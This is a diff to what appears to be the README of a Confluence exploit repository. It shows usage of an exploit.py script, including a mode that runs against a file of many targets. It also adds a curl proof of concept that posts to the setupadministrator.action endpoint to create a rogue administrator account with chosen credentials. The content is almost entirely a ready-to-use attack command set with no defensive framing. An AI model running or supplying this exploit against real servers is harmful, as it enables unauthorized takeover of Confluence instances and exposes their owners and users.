@@ -23,3 +23,11 @@ python3 exploit.py normal https://example.com/confluence
 ```
 python3 exploit.py mass targets.txt
 ```
+### Curl POC
+```
+curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://URL/confluence/setup/setupadministrator.action
+```
+```
+Login: YourNewAdminLogin
+Pass: YourPass
+```
